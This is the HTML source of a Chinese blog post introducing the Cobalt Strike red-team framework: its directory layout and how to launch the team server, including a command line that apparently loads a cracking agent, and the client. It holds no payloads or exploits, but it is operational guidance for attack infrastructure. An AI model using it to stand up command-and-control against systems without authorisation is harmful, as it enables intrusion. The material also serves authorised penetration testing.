@@ -1,0 +1,842 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>CS-Cobalt Strike必备知识 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="总字符数: 15.71K                代码: 8.69K, 文本: 2.47K               预计阅读时间: 49 分钟            CS简介什么是CS Cobalt Strike是一款基于java语言开发的渗透测试神器，常被业界人称为CS神器。它被广泛用于模拟高级持久性威胁(Advanced Persistent Threat，APT)和进行内">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CS-Cobalt Strike必备知识">
+<meta property="og:url" content="https://jiangjiyue.github.io/2024/09/24/3c3f9499/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="总字符数: 15.71K                代码: 8.69K, 文本: 2.47K               预计阅读时间: 49 分钟            CS简介什么是CS Cobalt Strike是一款基于java语言开发的渗透测试神器，常被业界人称为CS神器。它被广泛用于模拟高级持久性威胁(Advanced Persistent Threat，APT)和进行内">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241915663.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241915074.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241915032.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916576.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916045.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916722.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916099.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916390.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916782.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917271.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917019.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917632.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917687.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917367.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241953934.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917806.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241917303.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918299.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918002.webp">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918392.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918854.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918325.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918110.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918485.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241918148.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920986.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920952.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920371.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920132.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920611.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920423.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241920168.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241921645.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241921896.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241921865.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241922000.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241922338.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241923597.png">
+<meta property="article:published_time" content="2024-09-24T11:50:49.000Z">
+<meta property="article:modified_time" content="2024-09-24T11:53:50.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="Cobalt Strike">
+<meta property="article:tag" content="后渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241915663.png">
+  
+  
+  
+  <meta name="keywords" content="Cobalt Strike,后渗透">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：Cobalt Strike</span></div><div class="widget-body"><a class="item active" href="/2024/09/24/3c3f9499/"><span class="title">CS-Cobalt Strike必备知识</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a><a class="item" href="/2024/09/25/3c3f9499/"><span class="title">CS-Cobalt Strike修改特征</span></a><a class="item" href="/2024/09/26/da146604/"><span class="title">CS-云函数隐匿C2</span></a><a class="item" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a><a class="item" href="/2024/10/28/ce454855/"><span class="title">CS-开发环境配置及exe处理</span></a><a class="item" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a><a class="item title" href="/2023/03/11/247b757/"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item title" href="/2023/04/28/76971e68/"><span class="title">VulHub-Tomcat漏洞复现</span></a><a class="item title" href="/2024/07/05/dd58c5ed/"><span class="title">应急响应之Webshell流量分析</span></a><a class="item title" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2024/09/24/3c3f9499/">Cobalt Strike</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-09-24T11:50:49.000Z">2024-09-24</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-09-24T11:53:50.000Z">2024-09-24</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>CS-Cobalt Strike必备知识</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
+    <p>总字符数: 15.71K </p>
+    </div>
+    <div class="cell" style="">
+    <p>代码: 8.69K, 文本: 2.47K</p>
+    </div>
+    <div class="cell" style="">
+    <p>预计阅读时间: 49 分钟</p>
+    </div>
+    </div>
+
+<h2 id="CS简介"><a href="#CS简介" class="headerlink" title="CS简介"></a>CS简介</h2><h3 id="什么是CS"><a href="#什么是CS" class="headerlink" title="什么是CS"></a>什么是CS</h3><blockquote>
+<p>Cobalt Strike是一款基于java语言开发的渗透测试神器，常被业界人称为CS神器。它被广泛用于模拟<strong>高级持久性威胁</strong>(Advanced Persistent Threat，APT)和进行内网渗透。</p>
+<p>分为<strong>客户端与服务端</strong> (CS架构的)，多用于团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和sessions，可模拟APT做模拟对抗，进行内网渗透。 </p>
+<p>Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括:站点克隆，目标信息获取， </p>
+<p>java执行，浏览器自动攻击等等</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">官方网站</a></p>
+<p><a target="_blank" rel="noopener" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm#_Toc65482705">官方文档</a></p>
+<h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241915663.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">logs                                <span class="comment"># 日志记录与目标主机的相关信息 </span></span><br><span class="line">resources                           <span class="comment"># 资源文件的目录</span></span><br><span class="line">scripts                             <span class="comment"># Cobalt Strike脚本的目录</span></span><br><span class="line">.cobaltstrike.beacon_keys           <span class="comment"># Cobalt Strike Beacon的密钥信息的文件</span></span><br><span class="line">agscript                            <span class="comment"># 拓展应用的脚本.用于自动化和定制化渗透测试过程</span></span><br><span class="line">c2lint                              <span class="comment"># 用于检查 profile 文件</span></span><br><span class="line">cobaltstrike,cobaltstrike.jar       <span class="comment"># 客户端程序(java跨平台)</span></span><br><span class="line">cobaltstrike.bat                    <span class="comment"># windows平台快速启动客户端的bat文件</span></span><br><span class="line">cobaltstrike.store                  <span class="comment"># Cobalt Strike的ssl证书文件</span></span><br><span class="line">CSAgent.jar                         <span class="comment"># 用于代理通信的Java可执行文件</span></span><br><span class="line">icon.jpg                            <span class="comment"># 图标</span></span><br><span class="line">peclone                             <span class="comment"># 克隆和操作PE文件的工具或脚本</span></span><br><span class="line">start.sh                            <span class="comment"># 用于在Unix/Linux系统上启动Cobalt Strike的Shell脚本</span></span><br><span class="line">teamserver                          <span class="comment"># 启动服务端的sh脚本</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="安装和运行"><a href="#安装和运行" class="headerlink" title="安装和运行"></a>安装和运行</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>团队服务器最好运行在 Linux平台上，服务端的关键文件是<code>teamserver</code>和<code>cobaltstrike.jar</code>，将这两个文件放在同一目录下运行 , teamserver要有可以运行的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> +x teamserver</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;host&gt; 必需参数 团队服务器IP</span></span><br><span class="line"><span class="comment"># &lt;password&gt; 必需参数 连接服务器的密码</span></span><br><span class="line"><span class="comment"># [/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性</span></span><br><span class="line"><span class="comment"># [YYYY-MM-DD] 可选参数 所有payload的终止时间</span></span><br><span class="line">sudo ./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line"><span class="comment"># 一般启动Team Server</span></span><br><span class="line">sudo ./teamserver 192.168.74.131 3wHv<span class="comment">#4WeFjH@kilayu#s    # 设置强密码，否则容易被爆破，参考附录</span></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241915074.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241915032.png" data-fancybox="true"/></div></div>
+
+<p>默认端口为50050。如果要修改端口号需编辑<code>teamserver</code>文件<code>sudo vim teamserver</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># start the team server.</span></span><br><span class="line">java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=Microsoft -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=f38eb3d1a335b252b58bc2acde81b542 -Duser.language=en server.TeamServer $*</span><br><span class="line"></span><br><span class="line">-XX:ParallelGCThreads=4 <span class="comment"># 设置并行垃圾回收线程数为4</span></span><br><span class="line">-Dcobaltstrike.server_port=50050 <span class="comment"># 指定端口号为50050</span></span><br><span class="line">-Dcobaltstrike.server_bindto=0.0.0.0 <span class="comment"># 绑定到所有可用的网络接口</span></span><br><span class="line">-Djavax.net.ssl.keyStore=./cobaltstrike.store <span class="comment"># 设置 SSL 的密钥库文件路径为 ./cobaltstrike.store用于SSL/TLS加密连接</span></span><br><span class="line">-Djavax.net.ssl.keyStorePassword=Microsoft <span class="comment"># cobaltstrike.store密钥库的密码为Microsoft</span></span><br><span class="line">-server <span class="comment"># 让JVM使用服务器模式来运行</span></span><br><span class="line">-XX:+AggressiveHeap <span class="comment"># JVM设置</span></span><br><span class="line">-XX:+UseParallelGC  <span class="comment"># 垃圾回收机制</span></span><br><span class="line">-classpath ./cobaltstrike.jar <span class="comment"># 指向主应用程序的 JAR 文件</span></span><br><span class="line">-javaagent:CSAgent.jar=f38eb3d1a335b252b58bc2acde81b542 <span class="comment"># 指定CSAgent.jar文件并传入参数</span></span><br><span class="line">-Duser.language=en <span class="comment"># 设置语言</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>Linux:<code>chmod +x start.sh</code></p>
+<p>Windows: <code>cobaltstrike.bat</code></p>
+<p>如果Java未设置变量请将对应文件中的Java替换为具体的路径</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202409241916576.png" data-fancybox="true"/></div></div>
+
